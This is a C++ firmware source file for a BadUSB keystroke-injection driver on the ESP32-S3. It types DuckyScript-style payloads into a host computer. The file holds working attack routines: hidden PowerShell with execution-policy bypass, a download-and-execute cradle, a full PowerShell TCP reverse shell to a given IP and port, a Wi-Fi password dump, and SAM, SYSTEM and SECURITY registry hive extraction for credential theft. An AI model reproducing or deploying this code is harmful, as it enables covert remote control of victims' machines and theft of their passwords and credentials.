/**
 * @file usb_driver.cpp
 * @brief USB HID Attack Driver Implementation
 *
 * Implements BadUSB functionality using ESP32-S3 native USB HID.
 * Supports DuckyScript-like payload execution.
 *
 * @author MorphNode Team
 * @date 2026-01-08
 */

#include "usb_driver.h"
#include "core/aggressive_sd.h"

// ============================================================================
// STATIC MEMBER INITIALIZATION
// ============================================================================
bool USBDriver::_initialized = false;
bool USBDriver::_keyboardActive = false;

#if CONFIG_IDF_TARGET_ESP32S3
USBHIDKeyboard USBDriver::_keyboard;
#endif

// ============================================================================
// INITIALIZATION
// ============================================================================
bool USBDriver::init() {
#if CONFIG_IDF_TARGET_ESP32S3
    if (_initialized) return true;

    Serial.println("[USB] Initializing USB HID...");

    // Initialize USB stack
    USB.begin();

    _initialized = true;
    Serial.println("[USB] USB HID ready (not started)");
    return true;
#else
    Serial.println("[USB] USB HID not supported on this platform");
    return false;
#endif
}

bool USBDriver::isReady() { return _initialized; }

// ============================================================================
// KEYBOARD CONTROL
// ============================================================================
void USBDriver::startKeyboard() {
#if CONFIG_IDF_TARGET_ESP32S3
    if (!_initialized) init();

    if (!_keyboardActive) {
        _keyboard.begin();
        _keyboardActive = true;
        Serial.println("[USB] Keyboard started");
        delay(1000); // Wait for host to recognize device
    }
#endif
}

void USBDriver::stopKeyboard() {
#if CONFIG_IDF_TARGET_ESP32S3
    if (_keyboardActive) {
        _keyboard.end();
        _keyboardActive = false;
        Serial.println("[USB] Keyboard stopped");
    }
#endif
}

// ============================================================================
// TYPING FUNCTIONS
// ============================================================================
void USBDriver::type(const char *text) {
#if CONFIG_IDF_TARGET_ESP32S3
    if (!_keyboardActive) startKeyboard();

    _keyboard.print(text);
    Serial.printf("[USB] Typed: %s\n", text);
#endif
}

void USBDriver::typeWithDelay(const char *text, uint16_t delayMs) {
#if CONFIG_IDF_TARGET_ESP32S3
    if (!_keyboardActive) startKeyboard();

    for (int i = 0; text[i] != '\0'; i++) {
        _keyboard.write(text[i]);
        delay(delayMs);
    }
#endif
}

void USBDriver::pressKey(uint8_t key, uint8_t modifier) {
#if CONFIG_IDF_TARGET_ESP32S3
    if (!_keyboardActive) startKeyboard();

    if (modifier) { _keyboard.press(modifier); }
    _keyboard.press(key);
    delay(50);
    _keyboard.releaseAll();
    delay(50);
#endif
}

// ============================================================================
// PAYLOAD EXECUTION
// ============================================================================
void USBDriver::executePayload(const char *script) {
#if CONFIG_IDF_TARGET_ESP32S3
    if (!_keyboardActive) startKeyboard();

    Serial.println("[USB] Executing payload...");

    // Parse script line by line
    String scriptStr = String(script);
    int startIdx = 0;
    int endIdx = 0;

    while ((endIdx = scriptStr.indexOf('\n', startIdx)) != -1) {
        String line = scriptStr.substring(startIdx, endIdx);
        line.trim();
        parseAndExecuteLine(line.c_str());
        startIdx = endIdx + 1;
    }

    // Handle last line without newline
    if (startIdx < scriptStr.length()) {
        String line = scriptStr.substring(startIdx);
        line.trim();
        parseAndExecuteLine(line.c_str());
    }

    Serial.println("[USB] Payload complete");
#endif
}

void USBDriver::parseAndExecuteLine(const char *line) {
#if CONFIG_IDF_TARGET_ESP32S3
    if (strlen(line) == 0 || line[0] == '#') return; // Comment or empty

    String cmd = String(line);

    // DuckyScript-like commands
    if (cmd.startsWith("DELAY ")) {
        int ms = cmd.substring(6).toInt();
        delay(ms);
    } else if (cmd.startsWith("STRING ")) {
        type(cmd.substring(7).c_str());
    } else if (cmd == "ENTER" || cmd == "RETURN") {
        _keyboard.write('\n');
    } else if (cmd == "TAB") {
        _keyboard.write('\t');
    } else if (cmd == "ESCAPE" || cmd == "ESC") {
        pressKey(KEY_ESC);
    } else if (cmd == "SPACE") {
        _keyboard.write(' ');
    } else if (cmd == "BACKSPACE") {
        pressKey(KEY_BACKSPACE);
    } else if (cmd == "DELETE") {
        pressKey(KEY_DELETE);
    } else if (cmd == "UPARROW" || cmd == "UP") {
        pressKey(KEY_UP);
    } else if (cmd == "DOWNARROW" || cmd == "DOWN") {
        pressKey(KEY_DOWN);
    } else if (cmd == "LEFTARROW" || cmd == "LEFT") {
        pressKey(KEY_LEFT);
    } else if (cmd == "RIGHTARROW" || cmd == "RIGHT") {
        pressKey(KEY_RIGHT);
    } else if (cmd.startsWith("GUI ") || cmd.startsWith("WINDOWS ")) {
        char key = cmd.charAt(cmd.indexOf(' ') + 1);
        _keyboard.press(KEY_LEFT_GUI);
        _keyboard.press(key);
        delay(50);
        _keyboard.releaseAll();
    } else if (cmd == "GUI" || cmd == "WINDOWS") {
        pressKey(KEY_LEFT_GUI);
    } else if (cmd.startsWith("CTRL ")) {
        char key = cmd.charAt(5);
        _keyboard.press(KEY_LEFT_CTRL);
        _keyboard.press(key);
        delay(50);
        _keyboard.releaseAll();
    } else if (cmd.startsWith("ALT ")) {
        char key = cmd.charAt(4);
        _keyboard.press(KEY_LEFT_ALT);
        _keyboard.press(key);
        delay(50);
        _keyboard.releaseAll();
    } else if (cmd.startsWith("SHIFT ")) {
        char key = cmd.charAt(6);
        _keyboard.press(KEY_LEFT_SHIFT);
        _keyboard.press(key);
        delay(50);
        _keyboard.releaseAll();
    } else if (cmd.startsWith("CTRL-ALT ")) {
        char key = cmd.charAt(9);
        _keyboard.press(KEY_LEFT_CTRL);
        _keyboard.press(KEY_LEFT_ALT);
        _keyboard.press(key);
        delay(50);
        _keyboard.releaseAll();
    } else if (cmd == "CTRL-ALT-DELETE") {
        _keyboard.press(KEY_LEFT_CTRL);
        _keyboard.press(KEY_LEFT_ALT);
        _keyboard.press(KEY_DELETE);
        delay(50);
        _keyboard.releaseAll();
    } else if (cmd.startsWith("F")) {
        int fNum = cmd.substring(1).toInt();
        if (fNum >= 1 && fNum <= 12) { pressKey(KEY_F1 + fNum - 1); }
    } else {
        Serial.printf("[USB] Unknown command: %s\n", line);
    }

    delay(10); // Small delay between commands
#endif
}

bool USBDriver::executePayloadFromFile(const char *filename) {
    if (!AggressiveSD::isReady()) {
        Serial.println("[USB] SD card not ready");
        return false;
    }

    String content = AggressiveSD::readFile(filename);
    if (content.length() == 0) {
        Serial.printf("[USB] Failed to read payload: %s\n", filename);
        return false;
    }

    Serial.printf("[USB] Loading payload from: %s\n", filename);
    executePayload(content.c_str());
    return true;
}

// ============================================================================
// PREDEFINED PAYLOADS
// ============================================================================
void USBDriver::openRunDialog() {
#if CONFIG_IDF_TARGET_ESP32S3
    if (!_keyboardActive) startKeyboard();

    // Windows: Win+R
    _keyboard.press(KEY_LEFT_GUI);
    _keyboard.press('r');
    delay(50);
    _keyboard.releaseAll();
    delay(500);
#endif
}

void USBDriver::openTerminal() {
#if CONFIG_IDF_TARGET_ESP32S3
    if (!_keyboardActive) startKeyboard();

    // Windows PowerShell via Win+X, then i
    _keyboard.press(KEY_LEFT_GUI);
    _keyboard.press('x');
    delay(50);
    _keyboard.releaseAll();
    delay(500);
    _keyboard.write('i'); // PowerShell
    delay(1000);
#endif
}

void USBDriver::executePowerShell(const char *command) {
#if CONFIG_IDF_TARGET_ESP32S3
    if (!_keyboardActive) startKeyboard();

    // Open Run
    openRunDialog();
    delay(500);

    // Type powershell command
    type("powershell -w hidden -ep bypass -c \"");
    type(command);
    type("\"");
    _keyboard.write('\n');
#endif
}

void USBDriver::downloadAndExecute(const char *url) {
#if CONFIG_IDF_TARGET_ESP32S3
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "IEX(New-Object Net.WebClient).DownloadString('%s')", url);
    executePowerShell(cmd);
#endif
}

void USBDriver::reverseShell(const char *ip, uint16_t port) {
#if CONFIG_IDF_TARGET_ESP32S3
    char cmd[512];
    snprintf(
        cmd,
        sizeof(cmd),
        "$c=New-Object Net.Sockets.TCPClient('%s',%d);"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$o=(iex $d 2>&1|Out-String);"
        "$r=$o+'PS '+(pwd).Path+'> ';"
        "$t=([text.encoding]::ASCII).GetBytes($r);"
        "$s.Write($t,0,$t.Length);$s.Flush()}"
        "$c.Close()",
        ip,
        port
    );
    executePowerShell(cmd);
#endif
}

void USBDriver::exfilWiFiCredentials() {
#if CONFIG_IDF_TARGET_ESP32S3
    const char *payload = R"(
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000
STRING (netsh wlan show profiles) | Select-String '\:(.+)$' | %{$n=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$n" key=clear)} | select-string "Key Content\W+\:(.+)$" | %{$p=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{SSID=$n;PWD=$p}} | Format-Table -AutoSize | Out-File "$env:TEMP\wifi.txt"
ENTER
DELAY 2000
STRING type "$env:TEMP\wifi.txt"
ENTER
)";
    executePayload(payload);
#endif
}

void USBDriver::dumpSAM() {
#if CONFIG_IDF_TARGET_ESP32S3
    const char *payload = R"(
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden Start-Process powershell -Verb runAs
ENTER
DELAY 2000
STRING reg save hklm\sam C:\sam.hive
ENTER
DELAY 500
STRING reg save hklm\system C:\system.hive
ENTER
DELAY 500
STRING reg save hklm\security C:\security.hive
ENTER
)";
    executePayload(payload);
#endif
}
